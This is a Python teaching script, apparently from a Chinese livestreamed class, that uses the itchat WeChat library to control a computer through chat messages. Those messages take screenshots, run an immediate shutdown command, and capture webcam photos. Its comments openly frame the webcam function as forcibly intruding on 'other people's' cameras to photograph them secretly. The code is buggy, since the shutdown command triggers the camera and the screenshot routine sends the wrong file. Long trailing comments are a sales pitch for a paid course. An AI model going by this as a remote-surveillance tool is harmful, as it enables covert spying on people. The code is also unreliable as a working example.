#!/usr/bin/python3
# @Time      : 2019/7/13 19:30
# @Author    : 老杨
# @FileName  : wechat_control.py
# @Software  : PyCharm
"""
课题内容：微信远程控制他人电脑
主讲老师：老杨老师
开发环境：pycharm + python3
温馨提示：
学习没有太多捷径，但学习有方法。
为帮助同学们更好的学习到知识，收获最大化，
希望同学们能遵守下面的规则：
第一: 请不要拘泥于代码  思维远比代码更重要
第二：紧跟老师思维走，多和老师互动，有问题及时提出来

微信远程控制他人电脑
开发流程：
1.明确需求
    1.自己对开发需求都不足够理解，造成返工
    2.拒绝不合理的需求
2.大概思路分析
    不知道怎么做分析
    微信  远程控制  他人电脑
    肯定要和微信打交道
    控制：根据微信特定的对象的一些特定的指令微信消息进行特定的操作他人电脑
    1.帮助我们更好的理解需求，以及更好的去代码实现
3.代码实现
"""
# 大量的第三方库
# 标准库 -》
# pip install itchat
# pip install opencv-python
# pip install pillow
# 计算机的视觉库
# 导入第三方库
import itchat
import cv2
from PIL import ImageGrab
# 标准库
import os
def screen():
    # 截屏  会不会有问题，或者说只有我自己才能控制
    # 1
    # 你有手机，有微信 并且微信是你常用的生活微信-》你的微信没有被锁定
    6
    im = ImageGrab.grab()
    im.save('screen.png')
    itchat.send_image('laoyang.jpg', 'filehelper')
# 关机的操作
def cmd():
    os.system('shutdown /s /t 0')

# 强制性的侵入对方的电脑摄像头，偷拍下来
def photo():
    # 第一步。调用电脑的第一个摄像头
    cap = cv2.VideoCapture(0)
    # 读取摄像头
    # 第一个返回值表示：是否读取成功
    # 第一个返回值表示：读取到的资源
    ret,img = cap.read()
    if ret:
        # 将资源写入照片  1  2
        cv2.imwrite('laoyang.jpg',img)
        itchat.send_image('laoyang.jpg','filehelper')
    else:
        itchat.send('摄像头读取失败','filehelper')
    # 将摄像头释放关闭
    cap.release()
# 想让电脑关机，侵入电脑的摄像头来偷拍。。。。
# 编程的思想
def control(data):
    print(data)
    # 根据文本内容去执行操作
    if data=='关机':
        photo()
    if data=='偷拍':
        photo()
    if data == '录屏':
        screen()
# 得到微信的消息
# itchat的消息注册注册
# 只要接受到微信的文本消息，就自动调用下方的函数
# 函数当中必须携带一个参数
@itchat.msg_register(['Text'])
def message(msg):
    print(msg)
    # 提取出消息的内容，去除左右的空白
    data = msg['Text'].strip()
    # 文件传输助手
    # 消息是发给谁的
    ToUserName = msg['ToUserName']
    # 产品经理的思维  把用户当成傻子
    # 比方说，我自己给自己发了一条消息，就让文件助手自动跳出来
    # 消息是谁发的
    FromUserName = msg['FromUserName']
    if FromUserName==ToUserName:
        # 就让文件助手自动跳出来
        itchat.send('您现在可以操控电脑了','filehelper')
    # 判断消息是否发给文件助手
    if ToUserName =='filehelper':
        # 根据消息内容去操控电脑
        # 提高可读性
        # 方便调试和调用
        control(data)
def main():
    # 使用微信 登录微信
    itchat.auto_login(hotReload=True)
    # bug
    # 让微信先运行起来
    itchat.run()
# 主程序的人口
# 便于代码的维护
# 在当前脚本运行
if __name__ == '__main__':
    main()


    # 玩更骚的操作
    # 知识点的积累和实际的运用
    # 系统性全面性把python学好，玩更骚的操作 888 老杨，我想和你玩python
#你是希望通过颇有通红找工作-》找兼职  赚钱
# 51 15号正式开班
# 入班时间
# 基础不太好-》可以学吗？
# 51期  就是为了帮助我们零基础的同学学好
# 666
# 系统班级当中   详解-》
# 一开始的基础点-》一点点的
#
# 7880  在今天老师下课之前   15
# 九折优惠
# 学python ->学习什么？
# 掌握如以下知识点-》就业市场要求你会什么？
# python
# 第一：python的编程技巧
# Linux
# 数据库  数据存储
# 前端
# 最重要的
# *****项目实战能力
# 一切从学员的角度去考虑
# 7880元 0.9 截至到老师下课之前  最后的3个名额
# 五个月的时间
# 直到学号了，学会了，我们才让你毕业
#
#分阶段 先打好基础  在综合结合项目  -》保证我们的学员 毕业课直接就业
# 第一：每堂课都有一个课后的作业 -》
# 分一个阶段  阶段的考核  -》免费的重修  1 2 3
# python工资高 10K
# python
# 2017年底
# 人工智能
# web开发  爬虫 数据分析 机器学习 数据挖掘 自动化运维
# web开发
# 第一工作岗位多
# 工资高
# 目前来讲就业门槛低

# python   C语言写出来的
# 语言特点的导致的   简洁高效  大量的第三方库存在
# C  上千行   Java  几百行  python  几十行十几行
# 一个公司  为了在最短时间
# 他的语言特点 简洁，容易学习 可以使用与多方像
# 2017年-》python  40万
# 人才
# 零基础 -》1000
# 赶紧学-》你就是和别人时间
# 晚上  视频直播互动的授课
# 高清视频录播-》
# 尤其是担心没时间的   两年学习卡 -》保障你的学习时间
# 666
# 15  后天正式开班  51-》50的   50期学员
# 学习就一定
# 1000
# 你是等一等，看一看
# 零基础的同学 -》2
# 2
# 1    1000
# 2
# 供需关系
# 实际开发能力
# python，  信息-》数据
# 保存-》展示
# Linux -》
#
# 数据库
# 前端
# 1991 2015年开始  人工智能-》
# 2017
# 移动互联网时代-》大数据时代-》人工智能
# python
# 2015 1
# 基础差，找工作（赚更多的钱）
# 1000  100
# 抓紧学  -》就业时长不会等你
# 明天下午三点
# 你先到了  那你等着把
# 那你等着把
# 老外-》
# 环境
# 系统性的学习
# 51
# 课程研发-》
# 666
#   有没有2